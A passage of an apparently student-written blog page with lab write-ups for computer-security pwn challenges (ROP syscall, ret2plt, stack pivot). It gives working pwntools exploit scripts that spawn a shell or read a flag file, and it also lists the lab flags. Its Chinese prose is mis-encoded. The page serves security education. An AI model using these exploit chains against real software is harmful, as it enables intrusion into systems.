)</code></pre></div></li><li>ç­‰åˆ°è·³åˆ°check functionå¾Œå°±å¯ä»¥é–‹å§‹æ¥return outputï¼Œä¸¦æŒ‰ç…§ä¸Šé¢çš„å…¬å¼å›æ¨flag</li></ol><h2 id=lab-rop_syscall>Lab-ROP_Syscall</h2><p>Flag: <code>flag{www.youtube.com/watch?v=apN1VxXKio4}</code></p><h3 id=è§£é¡Œæµç¨‹èˆ‡æ€è·¯-7>è§£é¡Œæµç¨‹èˆ‡æ€è·¯</h3><p>é€™ä¸€é¡Œå°±å’Œä¹‹å‰å¯«çš„<a href=https://hackmd.io/@SBK6401/rysBjQfjs rel=external target=_blank>Simple PWN - 0x12(Lab - rop++)</a>å·®ä¸å¤šï¼Œä¸€æ¨£æ˜¯åˆ©ç”¨è“‹ROP chainæ‹¿åˆ°shellï¼Œå…ˆçœ‹ä¸€ä¸‹checksec</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ checksec chal
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> <span style=color:#e6db74>&#39;/mnt/d/NTU/Second Year/Computer Security/PWN/Lab2/lab_rop_syscall/share/chal&#39;</span>
</span></span><span style=display:flex><span>    Arch:     amd64-64-little
</span></span><span style=display:flex><span>    RELRO:    Partial RELRO
</span></span><span style=display:flex><span>    Stack:    Canary found
</span></span><span style=display:flex><span>    NX:       NX enabled
</span></span><span style=display:flex><span>    PIE:      No PIE <span style=color:#f92672>(</span>0x400000<span style=color:#f92672>)</span></span></span></code></pre></div><p>è¦é”æˆé€™å€‹æ”»æ“Šéœ€è¦å¹¾å€‹æ¢ä»¶:</p><ol><li>ç¨‹å¼æœ¬èº«è¦æœ‰è¶³å¤ å¤šçš„gadget -> æœ€å¥½binaryæ˜¯statically linkï¼Œå¦‚æœä¸æ˜¯çš„è©±è¦çœ‹çœ‹æœ‰æ²’æœ‰è¾¦æ³•leakå‡ºlibc base addressï¼Œå†ç”¨libcä¸Šçš„gadget</li><li>PIEæ²’é–‹</li><li>æœ‰BOF
é€™æ¨£çš„è©±å°±å¯ä»¥ä½¿ç”¨rop chainçš„æ–¹æ³•æ‹¿åˆ°shellï¼Œç”¨rop gadgetæ‹¿åˆ°<code>pop rax ; ret</code>, <code>pop rdi ; ret</code>, <code>pop rsi ; ret</code>, <code>pop rdx ; ret</code>, <code>syscall</code>ç­‰gadgetï¼Œæ¥è‘—åˆ©ç”¨BOFçš„æ–¹å¼é€éå»ï¼Œç„¶å¾Œé‚„è¦è€ƒæ…®é€rop chainä¹‹å‰æœ‰å¤šå°‘çš„åƒåœ¾bytesï¼Œé€™å€‹å¯ä»¥ç›´æ¥ç”¨å‹•æ…‹çœ‹</li></ol><h3 id=exploit-2>Exploit</h3><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>from</span> pwn <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># r = process(&#39;./chal&#39;)</span>
</span></span><span style=display:flex><span>r <span style=color:#f92672>=</span> remote(<span style=color:#e6db74>&#39;10.113.184.121&#39;</span>, <span style=color:#ae81ff>10052</span>)
</span></span><span style=display:flex><span>context<span style=color:#f92672>.</span>arch <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;amd64&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>string_bin_sh <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x0000000000498027</span>
</span></span><span style=display:flex><span>pop_rax_ret <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x0000000000450087</span>
</span></span><span style=display:flex><span>pop_rdi_ret <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x0000000000401f0f</span>
</span></span><span style=display:flex><span>pop_rsi_ret <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x0000000000409f7e</span>
</span></span><span style=display:flex><span>pop_rdx_pop_rbx_ret <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x0000000000485e0b</span>
</span></span><span style=display:flex><span>syscall <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x0000000000401cc4</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>rop_chain <span style=color:#f92672>=</span> flat(
</span></span><span style=display:flex><span>    pop_rax_ret, <span style=color:#ae81ff>0x3b</span>,
</span></span><span style=display:flex><span>    pop_rdi_ret, string_bin_sh,
</span></span><span style=display:flex><span>    pop_rsi_ret, <span style=color:#ae81ff>0</span>,
</span></span><span style=display:flex><span>    pop_rdx_pop_rbx_ret, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>,
</span></span><span style=display:flex><span>    syscall
</span></span><span style=display:flex><span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>r<span style=color:#f92672>.</span>recvline()
</span></span><span style=display:flex><span>r<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;&gt; &#39;</span>)
</span></span><span style=display:flex><span>raw_input()
</span></span><span style=display:flex><span>r<span style=color:#f92672>.</span>sendline(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;a&#39;</span> <span style=color:#f92672>*</span> <span style=color:#ae81ff>24</span> <span style=color:#f92672>+</span> rop_chain)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>r<span style=color:#f92672>.</span>interactive()</span></span></code></pre></div><h2 id=lab-ret2plt>Lab-ret2plt</h2><p>Flag: <code>flag{__libc_csu_init_1s_P0w3RFu1l!!}</code></p><h3 id=è§£é¡Œæµç¨‹èˆ‡æ€è·¯-8>è§£é¡Œæµç¨‹èˆ‡æ€è·¯</h3><ol><li>checksec + file + ROPgadget<div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ checksec chal
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> <span style=color:#e6db74>&#39;/mnt/d/NTU/Second Year/Computer Security/PWN/Lab2/lab_ret2plt/share/chal&#39;</span>
</span></span><span style=display:flex><span>    Arch:     amd64-64-little
</span></span><span style=display:flex><span>    RELRO:    No RELRO
</span></span><span style=display:flex><span>    Stack:    No canary found
</span></span><span style=display:flex><span>    NX:       NX enabled
</span></span><span style=display:flex><span>    PIE:      No PIE <span style=color:#f92672>(</span>0x400000<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>$ file chal
</span></span><span style=display:flex><span>chal: ELF 64-bit LSB executable, x86-64, version <span style=color:#ae81ff>1</span> <span style=color:#f92672>(</span>SYSV<span style=color:#f92672>)</span>, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID<span style=color:#f92672>[</span>sha1<span style=color:#f92672>]=</span>f7ed984819a3908eff455bfcf87716d0fb298fac, <span style=color:#66d9ef>for</span> GNU/Linux 3.2.0, not stripped
</span></span><span style=display:flex><span>$ ROPgadget --binary chal
</span></span><span style=display:flex><span>...
</span></span><span style=display:flex><span>0x0000000000401263 : pop rdi ; ret
</span></span><span style=display:flex><span>...</span></span></code></pre></div>é¦–å…ˆçŸ¥é“é€™éš»binaryæ˜¯å‹•æ…‹link libraryï¼Œæ‰€ä»¥å¯æƒ³è€ŒçŸ¥ï¼Œrop gadgetä¸€å®šå°‘çš„å¯æ†ï¼Œæ‰€ä»¥æˆ‘å€‘ä¸å¤ªèƒ½å¤ ç›´æ¥åƒä¸Šä¸€é¡Œä¸€æ¨£æš´åŠ›é–‹ä¸€å€‹shellå‡ºä¾†ï¼Œç¨‹å¼ä¹Ÿæ²’æœ‰å¹«æˆ‘å€‘é–‹ï¼Œè®“æˆ‘å€‘å¯ä»¥ç›´æ¥è·³éå»ï¼Œä½†æ˜¯é€éROPgadgetçš„çµæœï¼Œé›–ç„¶æ±è¥¿éå¸¸å°‘ï¼Œ<strong>ä½†é‚„æ˜¯æœ‰<code>pop rdi ; ret</code>å¯ä»¥ç”¨</strong></li><li>é‚„æ˜¯æœ‰å¾ˆæ˜é¡¯çš„BOFçš„æ¼æ´ï¼Œæ­¤æ™‚å°±å¯ä»¥å˜—è©¦é¡ä¼¼got hijackçš„æ–¹å¼æ‰“çœ‹çœ‹
æµç¨‹:</li><li>é¦–å…ˆæˆ‘å€‘è¦çŸ¥é“libc base addressæ‰èƒ½å¤ åˆ©ç”¨æ‰£æ‰offsetçš„æ–¹å¼è·³åˆ°systemçš„åœ°æ–¹ï¼Œä½†æ˜¯ç¨‹å¼ä¸­ä¸¦æ²’æœ‰èƒ½å¤ ç›´æ¥leak base addressçµ¦æˆ‘å€‘çš„æ±è¥¿ï¼Œå› æ­¤æˆ‘å€‘å¯ä»¥è‡ªå·±æƒ³è¾¦æ³•leak: ==ret2plt==<div class="highlight wrap-code" dir=auto><pre tabindex=0><code>pop rdi ret
puts got address
puts plt</code></pre></div>é€™ä¸‰è¡Œçš„æ„æ€æ˜¯æŠŠputsçš„got addressï¼Œé€éputså°å‡ºä¾†çµ¦æˆ‘å€‘ -> puts(putè‡ªå·±çš„got address)</li><li>æœ‰äº†putsçš„got addressä¹‹å¾Œï¼Œå°±å¯ä»¥æ‰£æ‰putsåœ¨libcçš„offsetï¼Œå°±å¯ä»¥çŸ¥é“base addressï¼Œç„¶å¾Œæˆ‘å€‘å¯ä»¥çŸ¥é“systemçš„ç¢ºåˆ‡address<div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e># leak puts got address to calculate libc base address</span>
</span></span><span style=display:flex><span>puts_addr <span style=color:#f92672>=</span> u64(r<span style=color:#f92672>.</span>recv(<span style=color:#ae81ff>6</span>)<span style=color:#f92672>.</span>ljust(<span style=color:#ae81ff>8</span>, <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\x00</span><span style=color:#e6db74>&#39;</span>))
</span></span><span style=display:flex><span>libc_base <span style=color:#f92672>=</span> puts_addr <span style=color:#f92672>-</span> libc<span style=color:#f92672>.</span>symbols[<span style=color:#e6db74>&#39;puts&#39;</span>]
</span></span><span style=display:flex><span>libc<span style=color:#f92672>.</span>address <span style=color:#f92672>=</span> libc_base
</span></span><span style=display:flex><span>system_addr <span style=color:#f92672>=</span> libc<span style=color:#f92672>.</span>symbols[<span style=color:#e6db74>&#39;system&#39;</span>]</span></span></code></pre></div></li><li>ç¾åœ¨çš„å•é¡Œæœ‰å…©å€‹ï¼Œä¸€å€‹æ˜¯æˆ‘å€‘è¦æ€éº¼æŠŠ==/bin/sh==é€é€²å»ï¼Œå› ç‚ºå¦‚æœç›´æ¥çœ‹binaryçš„gadgetæ²’æœ‰<code>/bin/sh</code>æˆ–æ˜¯<code>/sh</code>çš„stringï¼Œä¸éæˆ‘å€‘å¯ä»¥ç›´æ¥ç”¨åŒæ¨£çš„æ–¹æ³•ï¼ŒæŠŠå­—ä¸²é€é€²å»<div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e># fetch user input -&gt; /bin/sh\x00</span>
</span></span><span style=display:flex><span>pop_rdi_ret
</span></span><span style=display:flex><span>bss_addr
</span></span><span style=display:flex><span>gets_plt,</span></span></code></pre></div>æ­¤æ™‚ä»–å°±æœƒåƒä½¿ç”¨è€…è¦è¼¸å…¥ï¼Œä¸¦æŠŠæˆ‘å€‘çš„è¼¸å…¥ä¸Ÿåˆ°bss address</li><li>å¦å¤–ä¸€å€‹å•é¡Œå°±æ˜¯æˆ‘å€‘è¦æ€éº¼å‘¼å«==system==ï¼Œå› ç‚ºé€™å€‹binaryæ˜¯å‹•æ…‹çš„ï¼Œä»£è¡¨ä¸€é–‹å§‹æ²’æœ‰linkåˆ°systemçš„è©±å°±ä¸èƒ½ç›´æ¥å‘¼å«ï¼Œå› æ­¤æˆ‘å€‘å¯ä»¥åˆ©ç”¨åŒæ¨£çš„æ–¹æ³•é”åˆ°==got hijacking==<div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e># fetch user input -&gt; system address</span>
</span></span><span style=display:flex><span>pop_rdi_ret
</span></span><span style=display:flex><span>puts_got
</span></span><span style=display:flex><span>gets_plt</span></span></code></pre></div>æ­¤æ™‚æˆ‘å€‘å¯ä»¥è¼¸å…¥systemçš„addressï¼Œç¶“éé€™ä¸‰è¡Œå¾Œæˆ‘å€‘å°±æˆåŠŸæŠŠputs got addressæ›æˆsystem got address</li><li>æ‰€æœ‰å·¥å…·éƒ½æº–å‚™å¥½äº†ï¼Œæ¥ä¸‹ä¾†åªè¦å‘¼å«putså°±å¯ä»¥äº†ï¼Œå¯¦éš›ä¸Šå°±æ˜¯å‘¼å«system<div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e># system(&#39;/bin/sh\x00&#39;)</span>
</span></span><span style=display:flex><span>pop_rdi_ret
</span></span><span style=display:flex><span>bss_addr
</span></span><span style=display:flex><span>puts_plt</span></span></code></pre></div></li></ol><h2 id=lab-stack-pivot>Lab-Stack Pivot</h2><p>Flag: <code>flag{Y0u_know_hoW2L3@k_canAry}</code></p><h3 id=è§£é¡Œæµç¨‹èˆ‡æ€è·¯-9>è§£é¡Œæµç¨‹èˆ‡æ€è·¯</h3><p>é€™ä¸€é¡ŒåŠ©æ•™æ˜¯é è¨­æˆ‘å€‘å¿…é ˆè¦ä½¿ç”¨stack pivotçš„æŠ€å·§æ‹¿åˆ°flagï¼Œä¸éæ²’æœ‰æ™‚é–“è¨­å®šseccompï¼Œæ‰€ä»¥æˆ‘å€‘è‡ªå·±å‡è£åªèƒ½ä½¿ç”¨read / write / opené€™ä¸‰å€‹syscall</p><ol><li>checksec + file<div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ checksec chal
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> <span style=color:#e6db74>&#39;/mnt/d/NTU/Second Year/Computer Security/PWN/Lab2/lab_stack_pivot/share/chal&#39;</span>
</span></span><span style=display:flex><span>    Arch:     amd64-64-little
</span></span><span style=display:flex><span>    RELRO:    Partial RELRO
</span></span><span style=display:flex><span>    Stack:    Canary found
</span></span><span style=display:flex><span>    NX:       NX enabled
</span></span><span style=display:flex><span>    PIE:      No PIE <span style=color:#f92672>(</span>0x400000<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>$ file chal
</span></span><span style=display:flex><span>chal: ELF 64-bit LSB executable, x86-64, version <span style=color:#ae81ff>1</span> <span style=color:#f92672>(</span>GNU/Linux<span style=color:#f92672>)</span>, statically linked, BuildID<span style=color:#f92672>[</span>sha1<span style=color:#f92672>]=</span>26fa8e6daa97baf7a26596ea91af5703dd932327, <span style=color:#66d9ef>for</span> GNU/Linux 3.2.0, not stripped</span></span></code></pre></div>é¦–å…ˆå¯ä»¥çœ‹åˆ°è©²binaryæ˜¯statically linkï¼Œæ‰€ä»¥ç›´è¦ºæ˜¯åˆ©ç”¨ROP chainæ‹¿åˆ°shellï¼Œä¸éä»”ç´°çœ‹source codeæœƒç™¼ç¾BOFçš„é•·åº¦é¡¯ç„¶ä¸å¤ªå¤ æˆ‘å€‘è“‹æˆshellï¼Œæ‰€ä»¥éœ€è¦ç”¨åˆ°stack pivotçš„æŠ€å·§ï¼Œæ§åˆ¶RBPè·³åˆ°å…¶ä»–çš„åœ°æ–¹ç¹¼çºŒå¯«</li><li>æ‰¾gadget<div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>leave_ret <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x0000000000401cfc</span>
</span></span><span style=display:flex><span>pop_rdi_ret <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x0000000000401832</span>
</span></span><span style=display:flex><span>pop_rsi_ret <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x000000000040f01e</span>
</span></span><span style=display:flex><span>pop_rax_ret <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x0000000000448d27</span>
</span></span><span style=display:flex><span>pop_rdx_ret <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x000000000040173f</span>
</span></span><span style=display:flex><span>syscall_ret <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x0000000000448280</span></span></span></code></pre></div>é€™é‚Šçš„é‡é»æ˜¯syscall reté€™å€‹gadgetï¼Œå…¶å¯¦ä»–ä¸æ˜¯syscallå®Œä¹‹å¾Œç›´æ¥retï¼Œè€Œæ˜¯åœ¨ç¶“éä¸€äº›åˆ¤æ–·æ‰æœƒé€²åˆ°retï¼Œé€™å€‹å¯ä»¥å¾gdbçœ‹å‡ºä¾†<div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>gefâ¤  x/10i 0x448280
</span></span><span style=display:flex><span>   0x448280 &lt;read+16&gt;:  syscall
</span></span><span style=display:flex><span><span style=color:#f92672>=</span>&gt; 0x448282 &lt;read+18&gt;:  cmp    rax,0xfffffffffffff000
</span></span><span style=display:flex><span>   0x448288 &lt;read+24&gt;:  ja     0x4482e0 &lt;read+112&gt;
</span></span><span style=display:flex><span>   0x44828a &lt;read+26&gt;:  ret</span></span></code></pre></div>æœƒé€™æ¨£çš„åŸå› æ˜¯æˆ‘å€‘åœ¨ROPgadgetä¸­æ‰¾ä¸åˆ°<code>syscall ; ret</code>çš„gadgetï¼Œæ‰€ä»¥åŠ©æ•™æç¤ºå¯ä»¥ç›´æ¥å¾read / writeé€™ç¨®functionæ‰¾ï¼Œé€™æ¨£syscallå®Œäº†ä¹‹å¾Œæœƒå¾ˆå¿«çš„æ¥åˆ°retï¼Œé€™æ¨£ä¸­é–“çš„æ“ä½œæ‰ä¸æœƒå¤ªå½±éŸ¿æˆ‘å€‘è“‹çš„rop</li><li>Construct ROP
é¦–å…ˆï¼Œæˆ‘å€‘çš„æµç¨‹æ˜¯
==main_fn â†’ bss_open â†’ main_fn â†’ bss_open â†’ main_fn â†’ bss_write==
æœƒé€™æ¨£çš„åŸå› æ˜¯æˆ‘å€‘åªèƒ½å¯«å…¥0x60çš„ç©ºé–“è€Œå·²ï¼Œæ‰€ä»¥æŠŠopen / read / writeåˆ†é–‹å¯«ï¼Œè€Œå¯«å®Œä¸”åŸ·è¡Œå®Œå¾Œæœƒå†è·³åŸmain_fnï¼Œé€™æ¨£æ‰èƒ½è®“æˆ‘å€‘å†è®€å–ä¸‹ä¸€æ®µçš„ROP payload
0. å¯«å…¥çš„bss_addrå’Œmain_fn address
<code>python bss_addr_open = 0x4c2700 bss_addr_read = 0x4c2800 bss_addr_write = 0x4c2900 main_fn = 0x401ce1</code><ol><li>å…ˆè®“rbpè·³åˆ°bss_openï¼Œç„¶å¾Œretåˆ°main_fnï¼Œæ¥è¦æ”¾åˆ°bss_opençš„payload<div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>trash_payload <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;a&#39;</span><span style=color:#f92672>*</span><span style=color:#ae81ff>0x20</span>
</span></span><span style=display:flex><span>r<span style=color:#f92672>.</span>sendline(trash_payload <span style=color:#f92672>+</span> p64(bss_addr_open) <span style=color:#f92672>+</span> p64(main_fn))</span></span></code></pre></div>ä¹‹å‰çš„rop chainæˆ‘å€‘æœƒæŠŠRBPä¸€èµ·è“‹æ‰ï¼Œä½†ç¾åœ¨å› ç‚ºè¦è·³åˆ°å…¶ä»–çš„åœ°æ–¹ï¼Œæ‰€ä»¥rbpçš„éƒ¨åˆ†å°±è·³åˆ°<code>0x4c2700</code>ï¼Œç„¶å¾Œret addressæ¥main_fn
ç”¨gdbè·Ÿä¸€ä¸‹ï¼Œæ”¾å®Œçš„çµæœå¤§æ¦‚æ˜¯é€™æ¨£<div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>0x00007ffc884f3670â”‚+0x0000: <span style=color:#e6db74>&#34;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#34;</span>   â† $rsp, $rsi
</span></span><span style=display:flex><span>0x00007ffc884f3678â”‚+0x0008: <span style=color:#e6db74>&#34;aaaaaaaaaaaaaaaaaaaaaaaa&#34;</span>
</span></span><span style=display:flex><span>0x00007ffc884f3680â”‚+0x0010: <span style=color:#e6db74>&#34;aaaaaaaaaaaaaaaa&#34;</span>
</span></span><span style=display:flex><span>0x00007ffc884f3688â”‚+0x0018: <span style=color:#e6db74>&#34;aaaaaaaa&#34;</span>
</span></span><span style=display:flex><span>0x00007ffc884f3690â”‚+0x0020: 0x00000000004c2700  â†’  &lt;transmem_list+0&gt; add BYTE PTR <span style=color:#f92672>[</span>rax<span style=color:#f92672>]</span>, al      â† $rbp
</span></span><span style=display:flex><span>0x00007ffc884f3698â”‚+0x0028: 0x0000000000401ce1  â†’  &lt;main+12&gt; lea rax, <span style=color:#f92672>[</span>rbp-0x20<span style=color:#f92672>]</span></span></span></code></pre></div>ç•¶main_fnåŸ·è¡Œå®Œleave(<code>mov rsp , rbp ; pop rbp ;</code>)çš„æ™‚å€™ï¼Œrbpå°±æœƒæŒ‡åˆ°==0x4c2700==ï¼Œç•¶æˆ‘å€‘retåˆ°main_fnæ™‚ï¼Œå°±å¯ä»¥å†æ¬¡è¼¸å…¥payloadæ”¾åˆ°0x4c2700</li><li>è§€å¯Ÿmain_fnçš„assembly<div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>gefâ¤  x/10i &amp;main
</span></span><span style=display:flex><span>   0x401cd5 &lt;main&gt;:     endbr64
</span></span><span style=display:flex><span>   0x401cd9 &lt;main+4&gt;:   push   rbp
</span></span><span style=display:flex><span>   0x401cda &lt;main+5&gt;:   mov    rbp,rsp
</span></span><span style=display:flex><span>   0x401cdd &lt;main+8&gt;:   sub    rsp,0x20
</span></span><span style=display:flex><span>   0x401ce1 &lt;main+12&gt;:  lea    rax,<span style=color:#f92672>[</span>rbp-0x20<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>   0x401ce5 &lt;main+16&gt;:  mov    edx,0x80
</span></span><span style=display:flex><span>   0x401cea &lt;main+21&gt;:  mov    rsi,rax
</span></span><span style=display:flex><span>   0x401ced &lt;main+24&gt;:  mov    edi,0x0
</span></span><span style=display:flex><span>   0x401cf2 &lt;main+29&gt;:  call   0x448270 &lt;read&gt;
</span></span><span style=display:flex><span>   0x401cf7 &lt;main+34&gt;:  mov    eax,0x0</span></span></code></pre></div>å¾ä»¥ä¸Šçš„codeå¯ä»¥çœ‹å¾—å‡ºä¾†ï¼Œæˆ‘å€‘æ˜¯è·³åˆ°0x401ce1ï¼Œæ‰€ä»¥rbpæœƒå¼µå‡º0x20çš„ç©ºé–“ï¼Œä¹Ÿå°±æ˜¯==0x4c2700-0x20=0x4c26e0==ï¼Œç„¶å¾Œreadåˆ°çš„å…§å®¹å°±æœƒæ”¾åˆ°é€™é‚Šä¾†</li><li>å¯«å…¥bss_addr_open
æˆ‘å€‘çš„ç›®æ¨™æ˜¯é”æˆ==fd = open("/home/chal/flag.txt", 0);==ï¼Œå…·é«”payloadå¦‚ä¸‹<div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>file_addr <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;/home/chal/flag.txt&#39;</span><span style=color:#f92672>.</span>ljust(<span style=color:#ae81ff>0x20</span>, <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\x00</span><span style=color:#e6db74>&#39;</span>)
</span></span><span style=display:flex><span>ROP_open <span style=color:#f92672>=</span> flat(
</span></span><span style=display:flex><span>    <span style=color:#75715e># Open file</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># fd = open(&#34;/home/chal/flag.txt&#34;, 0);</span>
</span></span><span style=display:flex><span>    bss_addr_read,
</span></span><span style=display:flex><span>    pop_rax_ret,    <span style=color:#ae81ff>2</span>,
</span></span><span style=display:flex><span>    pop_rdi_ret,    bss_addr_open <span style=color:#f92672>-</span> <span style=color:#ae81ff>0x20</span>,
</span></span><span style=display:flex><span>    pop_rsi_ret,    <span style=color:#ae81ff>0</span>,
</span></span><span style=display:flex><span>    pop_rdx_ret,    <span style=color:#ae81ff>0</span>,
</span></span><span style=display:flex><span>    syscall_ret,
</span></span><span style=display:flex><span>    main_fn
</span></span><span style=display:flex><span>)
</span></span><span style=display:flex><span>r<span style=color:#f92672>.</span>sendline(file_addr <span style=color:#f92672>+</span> ROP_open)</span></span></code></pre></div>é¦–å…ˆåŸæœ¬çš„0x20å°±æ‹¿ä¾†æ”¾æª”æ¡ˆçš„ä½å€ï¼Œä¸éç‚ºç”šéº¼å¾Œé¢é‚„è¦å†æ¥è‘—bss_addr_writeå‘¢?å°±å’Œä¸Šé¢ä¸€æ¨£ï¼Œæˆ‘å€‘è¦å¯«åˆ¥çš„rop payloadä¸Šå»ï¼Œå› ç‚ºåŸæœ¬çš„ä½å­ä¸å¤ å¯«äº†ï¼Œæ‰€ä»¥syscall_retå¾Œæ¥åˆ°main_fnï¼Œä»–æœƒè®€å–æˆ‘å€‘å¯«å…¥çš„rop payloadåˆ°bss_addr_readçš„åœ°æ–¹</li><li>å¯«å…¥bss_addr_read
æˆ‘å€‘è¦é”æˆçš„ç›®æ¨™æ˜¯==read(fd, buf, 0x30)==ï¼Œå…·é«”payloadå¦‚ä¸‹<div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>ROP_read <span style=color:#f92672>=</span> flat(
</span></span><span style=display:flex><span>    <span style=color:#75715e># Read the file</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># read(fd, buf, 0x30);</span>
</span></span><span style=display:flex><span>    bss_addr_write,
</span></span><span style=display:flex><span>    pop_rax_ret, <span style=color:#ae81ff>0</span>,
</span></span><span style=display:flex><span>    pop_rdi_ret, <span style=color:#ae81ff>3</span>, 
</span></span><span style=display:flex><span>    pop_rsi_ret, bss_addr_read,
</span></span><span style=display:flex><span>    pop_rdx_ret, <span style=color:#ae81ff>0x30</span>,
</span></span><span style=display:flex><span>    syscall_ret,
</span></span><span style=display:flex><span>    main_fn
</span></span><span style=display:flex><span>)
</span></span><span style=display:flex><span>r<span style=color:#f92672>.</span>sendline(file_addr <span style=color:#f92672>+</span> ROP_read)</span></span></code></pre></div></li><li>å¯«å…¥bss_addr_write
æˆ‘å€‘è¦é”æˆçš„ç›®æ¨™æ˜¯==write(fd, buf, 0x30)==ï¼Œå…·é«”payloadå¦‚ä¸‹<div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>ROP_write <span style=color:#f92672>=</span> flat(
</span></span><span style=display:flex><span>    <span style=color:#75715e># Write the file</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># write(1, buf, 0x30);</span>
</span></span><span style=display:flex><span>    bss_addr_write,
</span></span><span style=display:flex><span>    pop_rax_ret, <span style=color:#ae81ff>1</span>,
</span></span><span style=display:flex><span>    pop_rdi_ret, <span style=color:#ae81ff>1</span>,
</span></span><span style=display:flex><span>    pop_rsi_ret, bss_addr_read,
</span></span><span style=display:flex><span>    pop_rdx_ret, <span style=color:#ae81ff>0x30</span>,
</span></span><span style=display:flex><span>    syscall_ret,
</span></span><span style=display:flex><span>    <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>)
</span></span><span style=display:flex><span>r<span style=color:#f92672>.</span>sendline(file_addr <span style=color:#f92672>+</span> ROP_write)</span></span></code></pre></div></li></ol></li></ol><p>:::danger
